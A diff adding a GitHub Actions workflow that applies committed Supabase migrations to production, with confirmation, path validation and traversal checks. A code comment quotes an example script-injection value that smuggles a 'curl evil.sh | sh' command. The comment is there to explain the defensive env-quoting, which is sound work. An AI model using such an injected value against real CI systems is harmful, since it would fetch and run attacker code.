@@ -1,0 +1,100 @@
+name: Apply Supabase Migration
+
+# Migrations are applied through the Supabase Management API (see the
+# "Verify required schema exists in prod" step in supabase-functions.yml, which
+# fails a deploy when one has not landed). Until now "applying" meant a human
+# pasting SQL into the dashboard, which is why that verify step exists at all —
+# there was no record of what ran or when.
+#
+# This runs a migration FILE THAT IS ALREADY COMMITTED, so the thing applied to
+# production is reviewable in git rather than retyped into a web form. It is
+# manual-dispatch only and never runs on push: schema changes stay a deliberate
+# act, not a side effect of merging.
+#
+# Scope guard: the path must live under supabase/migrations/ and end in .sql, so
+# this cannot be repurposed into a general "run arbitrary SQL on prod" button.
+
+on:
+  workflow_dispatch:
+    inputs:
+      migration:
+        description: 'Path under supabase/migrations/ (e.g. supabase/migrations/20260809_watchlist_showtime.sql)'
+        required: true
+        type: string
+      confirm:
+        description: 'Type APPLY to confirm this writes to the production database'
+        required: true
+        type: string
+
+concurrency:
+  group: apply-migration
+  cancel-in-progress: false
+
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Validate input
+        # Inputs arrive via env, never interpolated into the script body.
+        # `${{ }}` inside a run: block is substituted as raw text before bash
+        # sees it, so a value like `x"; curl evil.sh | sh #` would execute —
+        # the textbook Actions script-injection hole. Quoting "$MIGRATION"
+        # keeps it data.
+        env:
+          MIGRATION: ${{ inputs.migration }}
+          CONFIRM: ${{ inputs.confirm }}
+        run: |
+          if [ "$CONFIRM" != "APPLY" ]; then
+            echo "::error::confirm must be exactly APPLY — refusing to touch production"
+            exit 1
+          fi
+          case "$MIGRATION" in
+            supabase/migrations/*.sql) ;;
+            *) echo "::error::migration must be a .sql file under supabase/migrations/"; exit 1 ;;
+          esac
+          # Reject traversal before the file is ever read.
+          case "$MIGRATION" in
+            *..*) echo "::error::path traversal rejected"; exit 1 ;;
+          esac
+          test -f "$MIGRATION" || { echo "::error::$MIGRATION not found on this ref"; exit 1; }
+          echo "Applying $MIGRATION:"
+          echo '--- 8< ---'
+          cat "$MIGRATION"
+          echo '--- >8 ---'
+
+      - name: Apply via Management API
+        env:
+          SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}
+          PROJECT_REF: ${{ secrets.SUPABASE_PROJECT_REF }}
+          MIGRATION: ${{ inputs.migration }}
+        run: |
+          set -euo pipefail
+          # Re-validate: this step must not trust that the previous one ran.
+          case "$MIGRATION" in
+            supabase/migrations/*.sql) ;;
+            *) echo "::error::refusing path outside supabase/migrations/"; exit 1 ;;
+          esac
+          # jq -Rs builds the JSON string so semicolons, quotes and newlines in
+          # the SQL survive intact — string interpolation mangles real DDL.
+          BODY=$(jq -Rs '{query: .}' < "$MIGRATION")
+          RES=$(curl -sS -w '\n%{http_code}' -X POST \
+            "https://api.supabase.com/v1/projects/$PROJECT_REF/database/query" \
+            -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "$BODY")
+          CODE=$(echo "$RES" | tail -1)
+          echo "$RES" | sed '$d'
+          if [ "$CODE" != "200" ] && [ "$CODE" != "201" ]; then
+            echo "::error::Management API returned HTTP $CODE"
+            exit 1
+          fi
+          echo "✓ Applied $MIGRATION"
+
+      - name: Notify on failure
+        if: failure()
+        uses: ./.github/actions/notify-failure
+        with:
+          title: 'Supabase migration apply failed'
+          severity: 'warning'
